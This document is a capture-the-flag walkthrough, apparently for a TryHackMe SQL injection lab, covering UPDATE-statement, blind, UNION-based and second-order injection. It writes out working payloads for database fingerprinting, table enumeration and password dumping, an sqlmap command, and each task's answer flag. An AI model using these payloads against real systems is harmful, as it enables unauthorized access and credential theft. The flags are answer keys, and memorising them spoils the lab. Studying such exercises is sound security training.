-----------------------------------------------
SQL Injection Attack on an UPDATE Statement:-
-----------------------------------------------

Log in to the “SQL Injection 5: UPDATE Statement” challenge and exploit the vulnerable profile page to find the flag. The credentials that can be used are:

    profileID: 10
    password: toor

After logging in and clicking on Edit Profile option try to edit the Nickname and Email field using the following payload:

',nickName='test',email='hacked

So only Nickname changes when inserting the payload in nickname input, lets try with Email input:

Both the fields changes and the query looked like that.

With this knowledge, we can try to identify what database is in use. There are a few ways to do this, but the easiest way is to ask the database to identify itself. The following queries can be used to identify MySQL, MSSQL, Oracle, and SQLite:

# MySQL and MSSQL
',nickName=@@version,email='

# For Oracle
',nickName=(SELECT banner FROM v$version),email='

# For SQLite
',nickName=sqlite_version(),email='

So the version is 3.22.0

Knowing what database we are dealing with makes it easier to understand how to construct our malicious queries. We can proceed to enumerate the database by extracting all the tables. In the code below, we perform a subquery to fetch all the tables from database and place them into the nickName field. The subquery is enclosed inside parantheses. The group_concat() function is used to dump all the tables simultaneously.

“The group_concat() function returns a string which is the concatenation of all non-NULL values of X. If parameter Y is present then it is used as the separator between instances of X. A comma (“,”) is used as the separator if Y is omitted. The order of the concatenated elements is arbitrary.”

',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='

By injecting the code above, we can see that the only table in the database is called “usertable” and “secrets”:

and the query was:

UPDATE usertable SET nickName='3.22.0',email='',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='' WHERE UID='1'

We can then continue by extract all the column names from the secrets:

',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='

we got:

and the query was:

UPDATE usertable SET nickName='usertable,secrets',email='',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='' WHERE UID='1'

By knowing the names of the columns, we can extract the data we want from the database. For example, the query below will extract “secret text” from secrets

',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='

What is the flag for SQL Injection 5: UPDATE Statement?

Ans. THM{b3a540515dbd9847c29cffa1bef1edfb}

-----------------------------------------------------------------------
Task 6 Vulnerable Startup: Broken Authentication 3 (Blind Injection):-
-----------------------------------------------------------------------

Goal

This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind SQL injection to extract the admin’s password.

What is the flag for this challenge?

Use Burp Suite to intercept and capture the request, and save the request as “req.txt”. Then use sql map with “ — technique=b” for blind injection:

sqlmap -r req.txt -a --technique=b

Ans. THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}

    Task 7 Vulnerable Startup: Vulnerable Notes:

To find the flag among the passwords, register a user with the name:

'  union select 1,group_concat(password) from users'

then login using the username and password:
Go to notes

What is the flag for this challenge?

Ans. THM{4644c7e157fd5498e7e4026c89650814}

-----------------------------------------------
Task 8 Vulnerable Startup: Change Password:-
-----------------------------------------------

Goal

For this challenge, the vulnerability on the note page has been fixed. A new change password function has been added to the application, so the users can now change their password by navigating to the Profile page. The new function is vulnerable to SQL injection because the UPDATE statement concatenates the username directly into the SQL query, as can be seen below. The goal here is to exploit the vulnerable function to gain access to the admin’s account.

The developer has used a placeholder for the password parameter because this input comes directly from the user. The username does not come directly from the user but is rather fetched from the database based on the user id stored in the session object. Therefore, the developer has thought that the username was safe to use and concatenated it directly into the query instead of using a placeholder:

UPDATE users SET password = ? WHERE username = '" + username + "'

To exploit this vulnerability and gain access to the admin’s user account, we can create a user with the name admin'-- -.

After having registered the malicious user, we can update the password for our new user to trigger the vulnerability. When changing the password, the application executes two queries. First, it asks the database for the username and password for our current user:

SELECT username, password FROM users WHERE id = ?

If all checks are fine, it will try to update the password for our user. Since the username gets concatenated directly into the SQL query, the executed query will look as follows:

UPDATE users SET password = ? WHERE username = 'admin' -- -'

This means that instead of updating the password for admin' -- -, the application updated the password for the admin user. After having updated the password, it is possible to log in as admin with the new password and view the flag.
Login using the created credentials
Create new password
Logout and login with username “admin”

Ans. THM{cd5c4f197d708fda06979f13d8081013}

-----------------------------------------
Task 9 Vulnerable Startup: Book Title:-
-----------------------------------------

Goal

A new function has been added to the page, and it is now possible to search books in the database. The new search function is vulnerable to SQL injection because it concatenates the user input directly into the SQL statement. The goal of the task is to abuse this vulnerability to find the hidden flag.

Create a new account and login, then go to:

after testing I found that it has 4 columns:

Now using the payload from earlier with a bit modification:

') union select 1,2,3,group_concat(password) from users-- -

What is the flag for this challenge?

Ans. THM{27f8f7ce3c05ca8d6553bc5948a89210}

    Task 10 Vulnerable Startup: Book Title 2:

Goal

In this challenge, the application performs a query early in the process. It then uses the result from the first query in the second query later without sanitization. Both queries are vulnerable, and the first query can be exploited through blind SQL injection. However, since the second query is also vulnerable, it is possible to simplify the exploitation and use UNION based injection instead of Boolean-based blind injection; making the exploitation easier and less noisy. The goal of the task is to abuse this vulnerability without using blind SQL injection and retrieve the flag.

' union select '-1''union select 1,2,3,4-- -

Injecting the string above will return the page seen here:

Now, Use what you learned about UNION-based SQL injection and exploit the vulnerable book search function to retrieve the flag.

' union select '-1''union select 1,2,3,group_concat(password) from users-- -

What is the flag for this challenge?

Ans. THM{183526c1843c09809695a9979a672f09}
